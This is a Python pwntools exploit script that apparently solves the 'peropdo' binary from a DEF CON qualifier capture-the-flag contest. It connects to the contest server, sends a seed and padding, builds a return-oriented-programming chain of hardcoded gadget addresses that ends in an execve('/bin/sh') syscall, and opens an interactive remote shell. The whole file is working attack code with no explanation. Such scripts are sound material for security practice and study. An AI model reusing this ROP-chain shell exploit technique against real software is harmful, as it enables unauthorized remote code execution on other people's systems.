from pwn import *

context.log_level = "DEBUG"

p = remote('peropdo_bb53b90b35dba86353af36d3c6862621.quals.shallweplayaga.me', 80)
#p = process('./peropdo')
pause()

seed = 0x048ab95a
name_addr = 0x80ecfed
pad =  name_addr - 0x80ecfc4
xor_eax = 0x08054b80
inc_eax = 0x0807bf06
pop_eax = 0x080e77a4
pop_ebx = 0x08058e28
pop_ecx = 0x080e5ee1
pop_edx = 0x0806f2fa
interrupt = 0x08049551

s = p32(seed)
for x in range(pad+4):
	s += ("A")
s += p32(pop_ebx) + p32(0x80ed051) # -> /bin/sh
s += p32(pop_edx) + p32(0x80ed05c) # envp
s += p32(pop_eax) + p32(0x80ed040) # argv - 0x24
s += p32(pop_ecx) + p32(0x80ed051) # -> /bin/sh
s += p32(0x08054322) # mov [eax + 0x24], ecx; ret
s += p32(pop_ecx) + p32(0x80ed064) # argv -> [*/bin/sh, 0]

s += p32(xor_eax)
for x in range(11):
	s += p32(inc_eax)

s += p32(interrupt)
s += "/bin/sh"

assert '\x09' not in s
assert '\x0a' not in s
assert '\x0b' not in s
assert '\x00' not in s

p.recv()
p.sendline(s)
p.recvuntil('?\n')
p.sendline("23")
p.recv()
p.sendline("n")
p.interactive()
